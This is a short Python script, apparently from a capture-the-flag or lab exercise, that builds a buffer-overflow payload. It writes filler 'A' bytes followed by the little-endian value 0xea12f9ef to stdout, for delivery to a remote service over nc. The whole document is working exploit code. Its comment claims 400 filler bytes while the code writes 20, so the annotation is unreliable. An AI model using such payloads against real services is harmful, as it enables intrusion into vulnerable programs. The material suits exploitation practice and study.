import sys
payload = b''
payload += b'A' * 20 # Add \x41 for 400 times
payload += b'\xef\xf9\x12\xea' # Add 0xea12f9ef to the payload in
# little-endian manner
sys.stdout.buffer.write(payload) # write bytes in standard output
print() # recommended to use for the nc-based exploitation
# to flush the remote server's stdin buffer